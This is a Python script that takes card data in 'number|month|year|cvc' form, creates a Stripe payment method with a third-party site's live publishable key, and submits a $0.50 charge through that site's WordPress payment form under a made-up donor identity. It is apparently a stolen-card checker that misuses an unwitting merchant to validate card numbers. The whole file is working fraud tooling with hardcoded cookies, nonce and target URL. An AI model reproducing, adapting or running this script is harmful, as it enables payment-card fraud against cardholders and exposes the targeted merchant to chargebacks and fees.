import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F4901af2b6b%3B+stripe-js-v3%2F4901af2b6b%3B+card-element&key=pk_live_51IVRriDPCt2tZCsX8E0VVtPadB8IgYZicwBLi7NavcohuncTtItPdiuY68MPdvJsaJ0n3KMJJc8WEgr9zFk23Xfk00fX0LtHvl'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    '__stripe_mid': '5820386d-a056-4a87-8b68-c10de8fef2775eac40',
	    'sbjs_migrations': '1418474375998%3D1',
	    'sbjs_current_add': 'fd%3D2025-04-13%2002%3A17%3A47%7C%7C%7Cep%3Dhttps%3A%2F%2Fvillagemusiccircles.com%2Fglobal-facilitator-payment-form%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
	    'sbjs_first_add': 'fd%3D2025-04-13%2002%3A17%3A47%7C%7C%7Cep%3Dhttps%3A%2F%2Fvillagemusiccircles.com%2Fglobal-facilitator-payment-form%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
	    'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36',
	    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fvillagemusiccircles.com%2Fglobal-facilitator-payment-form%2F',
	    '__stripe_sid': 'a497d9ce-e488-439d-8a57-0aafbf1d3df4c87ccd',
	}
	
	headers = {
	    'authority': 'villagemusiccircles.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '__stripe_mid=5820386d-a056-4a87-8b68-c10de8fef2775eac40; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-04-13%2002%3A17%3A47%7C%7C%7Cep%3Dhttps%3A%2F%2Fvillagemusiccircles.com%2Fglobal-facilitator-payment-form%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2025-04-13%2002%3A17%3A47%7C%7C%7Cep%3Dhttps%3A%2F%2Fvillagemusiccircles.com%2Fglobal-facilitator-payment-form%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fvillagemusiccircles.com%2Fglobal-facilitator-payment-form%2F; __stripe_sid=a497d9ce-e488-439d-8a57-0aafbf1d3df4c87ccd',
	    'origin': 'https://villagemusiccircles.com',
	    'referer': 'https://villagemusiccircles.com/global-facilitator-payment-form/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1744510751220',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=6796&_fluentform_3_fluentformnonce=c3482ab163&_wp_http_referer=%2Fglobal-facilitator-payment-form%2F&names_1%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&datetime=&email_3=rodamuser08%40gmail.com&phone_4=0817480671&country-list=&reason_for_payment_6%5B%5D=Other&input_text=Deposit&custom-payment-amount_1=0.50&payment_option_12=Pay%20by%20credit%20card&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '3',
	}
	
	r2 = requests.post(
	    'https://villagemusiccircles.com/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return (r2.json())
